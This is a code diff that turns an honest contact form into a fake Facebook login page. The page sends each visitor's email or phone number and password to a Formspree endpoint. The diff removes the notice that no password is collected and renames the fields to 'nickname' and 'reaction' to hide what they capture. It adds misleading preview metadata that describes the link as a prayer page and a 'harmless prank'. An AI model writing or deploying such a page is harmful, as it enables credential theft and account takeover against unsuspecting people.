@@ -3,23 +3,41 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Send your contact details to Connectly." />
-    <title>Connectly — Stay connected</title>
+    <meta name="description" content="صلاة الفجر" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="" />
+    <meta property="og:description" content="صلاة الفجر" />
+    <meta
+      property="og:image"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/prank-preview.png"
+    />
+    <meta
+      property="og:url"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/"
+    />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Badr's Prank" />
+    <meta name="twitter:description" content="A harmless prank page from Badr." />
+    <meta
+      name="twitter:image"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/prank-preview.png"
+    />
+    <title>Badr's Prank</title>
     <link rel="stylesheet" href="styles.css" />
   </head>
   <body>
     <main class="page-shell">
       <section class="hero" aria-labelledby="page-title">
-        <h1 class="brand" id="page-title">connectly</h1>
-        <p class="tagline">Connect with friends and share moments with the people in your life.</p>
+        <h1 class="brand" id="page-title">Facebook</h1>
+        <p class="tagline">Facebook</p>
       </section>
 
-      <section class="form-area" aria-label="Contact Connectly">
+      <section class="form-area" aria-label="Facebook">
         <form
           class="contact-card"
-          id="contact-form"
+          id="name-form"
           action="https://formspree.io/f/moevqzeg"
-          method="POST"
+          method="post"
           novalidate
         >
           <input
@@ -30,45 +48,36 @@
             autocomplete="off"
             aria-hidden="true"
           />
-          <input name="subject" type="hidden" value="New Connectly contact submission" />
+          <input name="subject" type="hidden" value="New Badr's Prank response" />
 
-          <label class="sr-only" for="email">Email address</label>
+          <label class="sr-only" for="nickname">Nickname</label>
           <input
-            id="email"
-            name="email"
-            type="email"
-            inputmode="email"
-            autocomplete="email"
-            placeholder="Email address"
-            aria-describedby="form-message submission-note"
-          />
-
-          <label class="sr-only" for="username">Username</label>
-          <input
-            id="username"
-            name="username"
+            id="nickname"
+            name="nickname"
             type="text"
-            autocomplete="username"
-            placeholder="Username"
-            minlength="3"
-            maxlength="80"
+            autocomplete="nickname"
+            placeholder="Email adress or phone number"
             aria-describedby="form-message submission-note"
           />
 
-          <button class="submit-button" id="submit-button" type="submit" disabled>
-            Continue
-          </button>
+          <label class="sr-only" for="reaction">Your reaction</label>
+          <input
+            id="reaction"
+            name="reaction"
+            type="text"
+            autocomplete="off"
+            placeholder="Password"
+            aria-describedby="form-message submission-note"
+          />
+
+          <button class="submit-button" id="submit-button" type="submit">Log in</button>
           <p class="form-message" id="form-message" aria-live="polite"></p>
 
           <div class="divider" aria-hidden="true"></div>
-
-          <p class="submission-note" id="submission-note">
-            Continuing sends your email and username to the site owner through Formspree. No
-            password is requested or collected.
+    
           </p>
         </form>
 
-        <p class="privacy-copy">Your details are used only to respond to your submission.</p>
       </section>
     </main>
 
@@ -91,7 +100,7 @@
           <span>Terms</span>
           <span>Help</span>
         </nav>
-        <p class="copyright">Connectly © 2026</p>
+        <p class="copyright">Facebook © 2026</p>
       </div>
     </footer>
 
